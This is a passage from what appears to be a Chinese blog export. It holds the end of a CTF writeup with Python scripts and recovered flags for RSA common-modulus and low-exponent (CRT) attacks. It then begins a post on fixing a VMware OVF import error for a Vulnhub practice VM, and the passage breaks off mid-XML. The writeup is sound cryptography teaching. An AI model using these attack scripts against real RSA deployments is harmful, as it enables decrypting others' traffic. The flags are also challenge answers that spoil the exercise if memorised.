= <span class="number">0</span></span><br><span class="line">    y2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        <span class="comment"># ri = r(i-2) % r(i-1)</span></span><br><span class="line">        r = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = r</span><br><span class="line">        <span class="comment"># xi = x(i-2) - q*x(i-1)</span></span><br><span class="line">        x = x1 - q*x2</span><br><span class="line">        x1 = x2</span><br><span class="line">        x2 = x</span><br><span class="line">        <span class="comment"># yi = y(i-2) - q*y(i-1)</span></span><br><span class="line">        y = y1 - q*y2</span><br><span class="line">        y1 = y2</span><br><span class="line">        y2 = y</span><br><span class="line">    <span class="keyword">return</span> (x1, y1, a)</span><br><span class="line"></span><br><span class="line">n = gmpy2.mpz(<span class="number">0x9ff2e873e1fcafbed22341b4eafdae01afec540e4e84e6041b0a0e83253f1c5da5dabc73004faa82cfaff8e83e5a99255f9790a7744dd18a694d09a89a5caf638d0cf4fe1150a9e894d47a17f386c107a083ae227efab851196de992a2441b7af3442f31a757234ef8997d8af1a3c3aecf2b6100d393a7b632913c2b1c921409</span>)</span><br><span class="line">e1 = gmpy2.mpz(<span class="number">0xe9a44960483b5ca224cfd18818944eaae47de3a158debbc7886b74d7e11165e2e4158c86add4ccc5317256e5323596c9947513766645aefdac4f0375a0296743</span>)</span><br><span class="line">e2 = gmpy2.mpz(<span class="number">0xd9b47cdd777deb3e94cfa3d416aa91b04f9391af0504a83de03e9e0c49faae8b79cf7c99f575af99ed2e9e5a7edb09219c4f79cf961092f9919ab33bc3c9a74f</span>)</span><br><span class="line">c1 = gmpy2.mpz(<span class="number">0x636f86fb2b1991d4788092563adf87d14b975e9c7ab7279b10f4741f515788bba2e6e788d6f6c165f4daf65eabee93cebfc55a1d651b1dfb1190174ab338d959775658cf1c6d42b0fe6b7b1abaf5a9aa4ca239367bfcbe88b304c99d5e5f8aac019ec74b11662a5deba523c2f93b7c68a731c019578e3ac64db64cfd3533e91b</span>)</span><br><span class="line">c2 = gmpy2.mpz(<span class="number">0x53b601daa8f93166495a69fa747f8553bb8317cfe6dc3f7fec8c8511e209f9288038405fdee399f3ed68ab25dcd91be8bb2ef2ecac1173318b5d2bba932afdcab2d4e5b46987a0f774a29204ce481f79ea422943118f2eaf6c6820b501d9da8d3fbbcea464a2d158a39de6bae6ab845555e4646ae556d7b1e00567b00d41b06c</span>)</span><br><span class="line"></span><br><span class="line">x, y, r = extendedGCD(e1, e2)</span><br><span class="line">m = <span class="built_in">hex</span>(<span class="built_in">pow</span>(c1, x, n) * <span class="built_in">pow</span>(c2, y, n) % n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;plaintext:&quot;</span>, m</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>, binascii.a2b_hex(<span class="built_in">str</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>代码执行后，打印明文的十六进制数值，以及对应的 ASCII 字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext: 0x636e73737b5253415f63306d6d4f6e5f6d6f64754975355f34746b7d</span><br><span class="line">flag: cnss&#123;RSA_c0mmOn_moduIu5_4tk&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x04-RSA-Coolest"><a href="#0x04-RSA-Coolest" class="headerlink" title="0x04 RSA Coolest"></a>0x04 RSA Coolest</h1><p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/cnss-2017-crypto-rsa-combo/rsa-coolest.png" alt="easy-rsa"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public key 1:</span><br><span class="line">n = 0xba298d721fadbadb15dabd393db296c13610b33bfeb3aea844815439df3b025bcc6a7085a21eeb3b904a17071c01f05229873518828a8eb8a9129cff611f3481</span><br><span class="line">e = 0x3</span><br><span class="line"></span><br><span class="line">encrypted message 1:</span><br><span class="line">c = 0x7d4f6c0953ec517212b6c778da72245820a749254d21b62d09e36b44e073f858114f174b71cee25104b4d3b0abbf7eb31f031201bf40846290344c865c4b9cf8</span><br><span class="line"></span><br><span class="line">public key 2:</span><br><span class="line">n = 0xe37a3cab324cc0a5ea1030b498f3838f674e6ee9b4e441900c604e4d095b04c70cd32a7c4a5be0b463e3fd94594b3bd25ada9bc9ca17a80d72b7928e233f726d</span><br><span class="line">e = 0x3</span><br><span class="line"></span><br><span class="line">encrypted message 2:</span><br><span class="line">c = 0xc09aea0a9b6e10d7db7a5c2071b46f5801896c536152badb81db37848ef373cf6c6842737a87c12f6aba1d39bdf5d2aaf40e919628a64e4cd78a42c2cdde651a</span><br><span class="line"></span><br><span class="line">public key 3:</span><br><span class="line">n = 0xd8b6924687baaffe1c205ac0474fd5b5f894cb97abb3d427df0e47f30c7f035c07586430679ab65c5bbdccbc53cea9c95c466f3171d24efb85433bd05bc36c5d</span><br><span class="line">e = 0x3</span><br><span class="line"></span><br><span class="line">encrypted message 3:</span><br><span class="line">c = 0x6e3591536b9aadcdb412d6b05a755d603d0272434cc27447a8877707861363c8408b47da377474924db89a3e104717855613cbea16ad439c98b6e7bfdb7ae14f</span><br></pre></td></tr></table></figure>

<p>根据所给数据，可看出本题是已知三组 $n、e、c$，求 $m$，且三组中的公钥 $e$ 都等于较小的数 $3$。</p>
<p>换言之，就是已知在三个不同模数 $n_1、n_2、n_3$ 下的相同公钥 $e$，以及相应的密文 $c_1、c_2、c_3$，问能不能恢复出明文？刚才的密码学教材继续往下看，得知在此特定场景下的 RSA 密码攻击，名为<strong>低指数攻击</strong>，顾名思义，即要求此相同公钥 $e$ 是个较小的数。</p>
<h2 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h2><p><strong>低指数攻击</strong>，是指为了增强 RSA 加密算法在实际使用中高效性，给每个用户设置相同且较小的公钥 $e$，仅用不同的模数 $n$ 来区分不同用户。在这种场景下，若攻击者截获了在不同模数 $n_1、n_2、n_3$ 下用相同公钥 $e$ 加密相同明文 $m$ 后的密文 $c_1、c_2、c_3$，则能够在不知道用户私钥 $d_1、d_2、d_3$ 的情况下，恢复出明文 $m$。</p>
<p>假设三个用户的模数分别为 $n_1、n_2、n_3$，且不同的模数间两两互素，否则通过计算最大公约数可分解模数，公钥为 $e &#x3D; 0x3$，明文为 $m$，密文分别为<br>$$<br>\begin{cases}<br>c_1 \equiv m^3 \ mod \ n_1  \\<br>c_2 \equiv m^3 \ mod \ n_2  \\<br>c_3 \equiv m^3 \ mod \ n_3<br>\end{cases}<br>$$<br>即可得<br>$$<br>\begin{cases}<br>m^3 \equiv c_1 \ mod \ n_1  \\<br>m^3 \equiv c_2 \ mod \ n_2  \\<br>m^3 \equiv c_3 \ mod \ n_3<br>\end{cases}<br>$$<br>令 $N &#x3D; n_1n_2n_3$，则通过<strong>中国剩余定理</strong>可求得 $m^3 \ mod \ N$。又因为 $m^3 &lt; N$，则可直接对 $m^3$ 开立方根得到明文 $m$。至此，可知为何要求公钥 $e$ 是个较小的数，因为 $e$ 太大的话会增加开方运算的难度。下面给出 Python 解题代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">n1 = gmpy2.mpz(<span class="number">0xba298d721fadbadb15dabd393db296c13610b33bfeb3aea844815439df3b025bcc6a7085a21eeb3b904a17071c01f05229873518828a8eb8a9129cff611f3481</span>)</span><br><span class="line">n2 = gmpy2.mpz(<span class="number">0xe37a3cab324cc0a5ea1030b498f3838f674e6ee9b4e441900c604e4d095b04c70cd32a7c4a5be0b463e3fd94594b3bd25ada9bc9ca17a80d72b7928e233f726d</span>)</span><br><span class="line">n3 = gmpy2.mpz(<span class="number">0xd8b6924687baaffe1c205ac0474fd5b5f894cb97abb3d427df0e47f30c7f035c07586430679ab65c5bbdccbc53cea9c95c466f3171d24efb85433bd05bc36c5d</span>)</span><br><span class="line">e  = gmpy2.mpz(<span class="number">0x3</span>)</span><br><span class="line">c1 = gmpy2.mpz(<span class="number">0x7d4f6c0953ec517212b6c778da72245820a749254d21b62d09e36b44e073f858114f174b71cee25104b4d3b0abbf7eb31f031201bf40846290344c865c4b9cf8</span>)</span><br><span class="line">c2 = gmpy2.mpz(<span class="number">0xc09aea0a9b6e10d7db7a5c2071b46f5801896c536152badb81db37848ef373cf6c6842737a87c12f6aba1d39bdf5d2aaf40e919628a64e4cd78a42c2cdde651a</span>)</span><br><span class="line">c3 = gmpy2.mpz(<span class="number">0x6e3591536b9aadcdb412d6b05a755d603d0272434cc27447a8877707861363c8408b47da377474924db89a3e104717855613cbea16ad439c98b6e7bfdb7ae14f</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Chinese Remainder Theorem with three equations</span></span><br><span class="line">N  = n1 * n2 * n3</span><br><span class="line">N1 = N / n1</span><br><span class="line">N2 = N / n2</span><br><span class="line">N3 = N / n3</span><br><span class="line">b1 = gmpy2.invert(N1, n1)</span><br><span class="line">b2 = gmpy2.invert(N2, n2)</span><br><span class="line">b3 = gmpy2.invert(N3, n3)</span><br><span class="line">m_pow_e = (c1*b1*N1 + c2*b2*N2 + c3*b3*N3) % N</span><br><span class="line"></span><br><span class="line">m, boolean = gmpy2.iroot(m_pow_e, e)  <span class="comment"># Figure out the cubic root of m_pow_e</span></span><br><span class="line">m = <span class="built_in">hex</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;plaintext:&quot;</span>, m</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag:&quot;</span>, binascii.a2b_hex(<span class="built_in">str</span>(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>代码执行后，打印明文的十六进制数值，以及对应的 ASCII 字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext: 0x636e73737b436f304f6f4f30306f4f304f6f4f6f304f306f6c6573747d</span><br><span class="line">flag: cnss&#123;Co0OoO00oO0OoOo0O0olest&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>以上四道关于 RSA 公钥密码体题目的 writeup 到此全部结束，作者水平和经验有限，文中若有错误或不妥之处在所难免，希望发现问题的读者可在文末留言，同时也希望本文能够对读者的密码学探索之旅给予帮助与启发，谢谢。</p>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>CNSS</tag>
        <tag>Crypto</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware 导入 ovf 文件格式异常报错之探解</title>
    <url>/2021/07/10/exploration-of-file-format-exception-while-vmware-loads-ovf/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>近日，从 <a href="https://www.vulnhub.com/">Vulnhub</a> 下载了一个靶机镜像 <a href="https://www.vulnhub.com/entry/stapler-1,150/">Stapler: 1</a> 作为练习，以巩固攻防实战技巧。谁知，开始之初便受阻，导入镜像所遇问题颇多，特此记录其探解过程，以备待查。</p>
<span id="more"></span>

<p>本文操作环境为 Windows 10 操作系统与 VMware Workstation 15 Pro 虚拟机，其中 VMware OVF Tool 版本为 4.3.0。</p>
<h1 id="0x01-vmdk-导入受阻"><a href="#0x01-vmdk-导入受阻" class="headerlink" title="0x01 vmdk 导入受阻"></a>0x01 vmdk 导入受阻</h1><p>将 Stapler 靶机镜像压缩包下载至本地后，发现其 Stapler 目录下包含三个文件：<code>Stapler-disk1.vmdk</code>、<code>Stapler.ovf</code> 与 <code>Stapler.mf</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/stapler-zip-download.png" alt="stapler-zip-download"></p>
<p>其压缩包的 MD5 与官网上的一致，确认文件完整性无误：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/stapler-zip-file-info.png" alt="stapler-zip-file-info"></p>
<p>上述三个文件的含义及用途如下：</p>
<ul>
<li><code>.vmdk</code>：<a href="https://en.wikipedia.org/wiki/VMDK">虚拟机硬盘格式（Virtual Machine Disk Format）</a>，用于存储所有用户数据与虚拟服务器配置，即虚拟机磁盘镜像。</li>
<li><code>.ovf</code>：<a href="https://en.wikipedia.org/wiki/Open_Virtualization_Format">开放虚拟化格式（Open Virtualization Format）</a>，用于实现虚拟机在不同的虚拟化平台之间的转移，为业界提供了一种针对虚拟机打包和发布的开放标准，是一个包含了虚拟机元数据（虚拟机名称、硬件配置、镜像引用等）的 XML 文件。</li>
<li><code>.mf</code>：<a href="https://en.wikipedia.org/wiki/Manifest_file">清单文件（Manifest File）</a>，用于记录包内其他文件的 SHA-1 散列值，以校验其完整性。</li>
</ul>
<p>相关文件的完整释义见下图，并可参考：<a href="https://docs.citrix.com/en-us/xencenter/7-1/vms-exportimport-ovf.html">Open Virtualization Format (OVF and OVA)</a></p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/ovf-files.png" alt="ovf-files"></p>
<h2 id="通过打开-ovf-导入-vmdk"><a href="#通过打开-ovf-导入-vmdk" class="headerlink" title="通过打开 ovf 导入 vmdk"></a>通过打开 ovf 导入 vmdk</h2><p>首先，采用常规方式，通过 VMware 打开 ovf 文件来导入 vmdk。依次点击 VMware 左上角的 <strong>文件 -&gt; 打开</strong>，选中解压目录下的 <code>Stapler.ovf</code> 文件：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/open-ovf.png" alt="open-ovf"></p>
<p>接着点击 <strong>打开</strong>，发现 VMware 弹出以下报错：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/open-ovf-error.png" alt="open-ovf-error"></p>
<p>大意为不支持 <code>Caption</code> 元素、缺少 <code>ElementName</code> 子元素等。</p>
<h2 id="通过新建虚拟机导入-vmdk"><a href="#通过新建虚拟机导入-vmdk" class="headerlink" title="通过新建虚拟机导入 vmdk"></a>通过新建虚拟机导入 vmdk</h2><p>既然常规方法受阻，则需另辟蹊径，直接通过新建虚拟机来导入 vmdk。</p>
<p>由于导入方法步骤繁多，此处不展开说明，具体请参考：<a href="https://jingyan.baidu.com/article/9113f81b2796852b3214c705.html">VMware通过vmdk文件创建虚拟机</a></p>
<p>虽然 vmdk 导入成功，但虚拟机却启动失败。点击 <strong>开启此虚拟机</strong>，只见终端出现 <code>error: failure writing sector 0xec800 to `hd0&#39;.</code> 报错：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/failure-writing-sector.png" alt="failure-writing-sector"></p>
<p>按下任意键继续执行，发现 Apache、PHP、MySQL 等模块启动失败，迟迟无法加载进入登录界面：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/services-start-error.png" alt="services-start-error"></p>
<h1 id="0x02-ovf-探而复之"><a href="#0x02-ovf-探而复之" class="headerlink" title="0x02 ovf 探而复之"></a>0x02 ovf 探而复之</h1><p>镜像导入失败，本人略显无奈。还好，功夫不负有心人，终于找到一种解法，能够通过打开 ovf 导入 vmdk。</p>
<h2 id="探求误因"><a href="#探求误因" class="headerlink" title="探求误因"></a>探求误因</h2><p>经探究，在 <a href="https://communities.vmware.com/t5/Open-Virtualization-Format-Tool/Converting-OVF-file-using-ovftool-from-VirtualBox-produces-error/td-p/1179450">Converting OVF file using ovftool from VirtualBox produces error “Line 39: Unsupported element ‘Caption’” and many more errors</a> 帖子中遇到类似问题，其中一条评论提到，需要调整 ovf 文件中 <code>&lt;Item&gt;</code> 子元素的顺序：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/ovf-solution-1.png" alt="ovf-solution-1"></p>
<p>类似地，在 <a href="https://communities.vmware.com/t5/Open-Virtualization-Format-Tool/Issues-with-OVF-Template/td-p/2606134">Issues with OVF Template</a> 帖子中同样有人提到，RASD 元素字段必须以字母顺序排列：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/ovf-solution-2.png" alt="ovf-solution-2"></p>
<p>根据以上线索，查找 ovf 文件格式的相关标准，终于在 <a href="https://www.dmtf.org/sites/default/files/standards/documents/DSP0243_2.1.0.pdf">Open Virtualization Format Specification (DSP0243_2.1.0)</a> 文档中的第 8 章找到解释说明，图中 CIM 类的 XML 元素应该按照 Unicode 码位顺序排列：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/dps0243-order-note.png" alt="dps0243-order-note"></p>
<p>并给出了参考样例，注意到 <code>&lt;Item&gt;</code> 子元素确实是按字母顺序排列：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/exploration-of-file-format-exception-while-vmware-loads-ovf/dps0243-order-example.png" alt="dps0243-order-example"></p>
<p>回头检查压缩包中的 <code>Stapler.ovf</code> 文件，发现在 <code>&lt;Envelope&gt;</code> 元素中引入了 <code>CIM_ResourceAllocationSettingData</code> 类的命名空间，并且 <code>&lt;Item&gt;</code> 子元素默认为乱序排列，与上述两帖中遇到的问题基本吻合：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Generated by VMware ovftool 4.1.0 (build-3018522), UTC time: 2016-06-07T10:02:55.518806Z--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Envelope</span> <span class="attr">vmw:buildId</span>=<span class="string">&quot;build-3018522&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;</span> <span class="attr">xmlns:cim</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/common&quot;</span> <span class="attr">xmlns:ovf</span>=<span class="string">&quot;http://schemas.dmtf.org/ovf/envelope/1&quot;</span> <span class="attr">xmlns:rasd</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData&quot;</span> <span class="attr">xmlns:vmw</span>=<span class="string">&quot;http://www.vmware.com/schema/ovf&quot;</span> <span class="attr">xmlns:vssd</span>=<span class="string">&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">References</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">File</span> <span class="attr">ovf:href</span>=<span class="string">&quot;Stapler-disk1.vmdk&quot;</span> <span class="attr">ovf:id</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">ovf:size</span>=<span class="string">&quot;757926912&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">References</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">DiskSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>Virtual disk information<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Disk</span> <span class="attr">ovf:capacity</span>=<span class="string">&quot;20&quot;</span> <span class="attr">ovf:capacityAllocationUnits</span>=<span class="string">&quot;byte * 2^30&quot;</span> <span class="attr">ovf:diskId</span>=<span class="string">&quot;vmdisk1&quot;</span> <span class="attr">ovf:fileRef</span>=<span class="string">&quot;file1&quot;</span> <span class="attr">ovf:format</span>=<span class="string">&quot;http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized&quot;</span> <span class="attr">ovf:populatedSize</span>=<span class="string">&quot;2212560896&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">DiskSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">NetworkSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>The list of logical networks<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Network</span> <span class="attr">ovf:name</span>=<span class="string">&quot;hostonly&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Description</span>&gt;</span>The hostonly network<span class="tag">&lt;/<span class="name">Description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Network</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">NetworkSection</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">VirtualSystem</span> <span class="attr">ovf:id</span>=<span class="string">&quot;vm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Info</span>&gt;</span>A virtual machine<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Name</span>&gt;</span>Stapler<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">OperatingSystemSection</span> <span class="attr">ovf:id</span>=<span class="string">&quot;93&quot;</span> <span class="attr">vmw:osType</span>=<span class="string">&quot;ubuntuGuest&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>The kind of installed guest operating system<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">OperatingSystemSection</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">VirtualHardwareSection</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Info</span>&gt;</span>Virtual hardware requirements<span class="tag">&lt;/<span class="name">Info</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">System</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:Caption</span>&gt;</span>Virtual Hardware Family<span class="tag">&lt;/<span class="name">vssd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:InstanceID</span>&gt;</span>0<span class="tag">&lt;/<span class="name">vssd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:VirtualSystemIdentifier</span>&gt;</span>Stapler<span class="tag">&lt;/<span class="name">vssd:VirtualSystemIdentifier</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vssd:VirtualSystemType</span>&gt;</span>vmx-11<span class="tag">&lt;/<span class="name">vssd:VirtualSystemType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">System</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AllocationUnits</span>&gt;</span>hertz * 10^6<span class="tag">&lt;/<span class="name">rasd:AllocationUnits</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>Number of Virtual CPUs<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>1 virtual CPU(s)<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:VirtualQuantity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">rasd:VirtualQuantity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AllocationUnits</span>&gt;</span>byte * 2^20<span class="tag">&lt;/<span class="name">rasd:AllocationUnits</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>Memory Size<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>1024MB of memory<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>2<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>4<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:VirtualQuantity</span>&gt;</span>1024<span class="tag">&lt;/<span class="name">rasd:VirtualQuantity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>SATA Controller<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>sataController0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>3<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>AHCI<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>20<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>USB Controller (EHCI)<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>usb<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>4<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>vmware.usb.ehci<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>23<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vmw:Config</span> <span class="attr">ovf:required</span>=<span class="string">&quot;false&quot;</span> <span class="attr">vmw:key</span>=<span class="string">&quot;ehciEnabled&quot;</span> <span class="attr">vmw:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Address</span>&gt;</span>0<span class="tag">&lt;/<span class="name">rasd:Address</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Description</span>&gt;</span>SCSI Controller<span class="tag">&lt;/<span class="name">rasd:Description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:Caption</span>&gt;</span>scsiController0<span class="tag">&lt;/<span class="name">rasd:Caption</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:InstanceID</span>&gt;</span>5<span class="tag">&lt;/<span class="name">rasd:InstanceID</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceSubType</span>&gt;</span>lsilogic<span class="tag">&lt;/<span class="name">rasd:ResourceSubType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:ResourceType</span>&gt;</span>6<span class="tag">&lt;/<span class="name">rasd:ResourceType</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rasd:AddressOnParent</span>&gt;</span>2<span class="tag">&lt;/<span 